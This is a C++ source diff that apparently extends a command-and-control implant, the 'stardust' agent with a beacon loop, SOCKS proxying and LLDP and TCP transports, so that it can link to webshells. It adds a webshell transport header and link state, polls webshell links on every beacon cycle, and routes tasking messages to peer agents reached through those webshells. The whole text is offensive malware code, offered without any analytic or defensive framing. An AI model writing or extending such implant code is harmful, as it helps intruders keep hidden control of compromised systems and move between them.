@@ -15,6 +15,7 @@
 #include <ssh_client.h>
 #include <transport_tcp.h>
 #include <transport_lldp.h>
+#include <transport_webshell.h>
 #include <stackstr.h>
 
 using namespace stardust;
@@ -109,6 +110,10 @@ declfn instance::instance(
 #if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( INCLUDE_CMD_LLDP_DISCONNECT ) || defined( LLDP_TRANSPORT )
     lldp_links = nullptr;
     lldp_link_state = nullptr;
+#endif
+#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
+    webshell_links = nullptr;
+    webshell_link_state = nullptr;
 #endif
 #if defined( TCP_TRANSPORT )
     tcp_listen_sock = TCP_INVALID_SOCKET;
@@ -508,6 +513,12 @@ auto declfn instance::beacon_loop() -> void {
         }
 #endif
 
+#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
+        if ( webshell_links && webshell_link_state ) {
+            starburst::ws_poll_links( *this );
+        }
+#endif
+
 #ifdef INCLUDE_CMD_SOCKS
         // poll SOCKS connections for data before building request
         if ( socks_state ) {
@@ -784,6 +795,21 @@ auto declfn instance::beacon_loop() -> void {
                                             break;
                                         }
                                         llnk = llnk->next;
+                                    }
+                                }
+#endif
+
+#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
+                                if ( !routed ) {
+                                    auto wlnk = webshell_links;
+                                    while ( wlnk ) {
+                                        if ( wlnk->connected && wlnk->agent_id && uuid_len > 0 &&
+                                             str_ncmp( wlnk->agent_id, target_uuid, uuid_len ) == 0 ) {
+                                            starburst::ws_link_send_msg( *this, wlnk, msg_data, msg_len );
+                                            routed = true;
+                                            break;
+                                        }
+                                        wlnk = wlnk->next;
                                     }
                                 }
 #endif
